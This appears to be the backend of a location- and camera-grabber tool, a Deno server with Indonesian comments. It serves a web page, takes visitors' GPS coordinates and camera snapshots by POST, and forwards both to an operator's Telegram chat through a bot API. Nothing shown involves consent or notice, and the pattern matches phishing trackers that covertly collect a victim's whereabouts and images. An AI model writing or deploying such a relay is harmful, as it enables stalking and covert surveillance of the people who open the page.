import { serveFile } from "https://deno.land/std@0.203.0/http/file_server.ts";

const TELEGRAM_TOKEN = Deno.env.get("TELEGRAM_TOKEN");
const CHAT_ID = Deno.env.get("CHAT_ID");

Deno.serve(async (req) => {
  const url = new URL(req.url);

  // Halaman utama
  if (url.pathname === "/") {
    return await serveFile(req, "./index.html");
  }

  // Terima lokasi
  if (req.method === "POST" && url.pathname === "/lokasi") {
    try {
      const { latitude, longitude, accuracy } = await req.json();
      const message =
        `📍 Lokasi diterima:\nLat: ${latitude}\nLon: ${longitude}\nAkurasi: ${accuracy}m\nhttps://www.google.com/maps?q=${latitude},${longitude}`;

      if (TELEGRAM_TOKEN && CHAT_ID) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
        });
      }

      return new Response("✅ Lokasi dikirim ke Telegram");
    } catch (err) {
      return new Response("❌ Error: " + err.message, { status: 500 });
    }
  }

  // Terima foto
  if (req.method === "POST" && url.pathname === "/upload") {
    try {
      const formData = await req.formData();
      const file = formData.get("photo");

      if (!file || !(file instanceof File)) {
        return new Response("❌ File tidak ditemukan", { status: 400 });
      }

      // Kirim foto ke Telegram
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
      const telegramForm = new FormData();
      telegramForm.append("chat_id", CHAT_ID!);
      telegramForm.append("photo", file, "snapshot.jpg");

      await fetch(telegramUrl, {
        method: "POST",
        body: telegramForm,
      });

      return new Response("✅ Foto dikirim ke Telegram!");
    } catch (err) {
      return new Response("❌ Gagal upload: " + err.message, { status: 500 });
    }
  }

  return new Response("404 Not Found", { status: 404 });
});
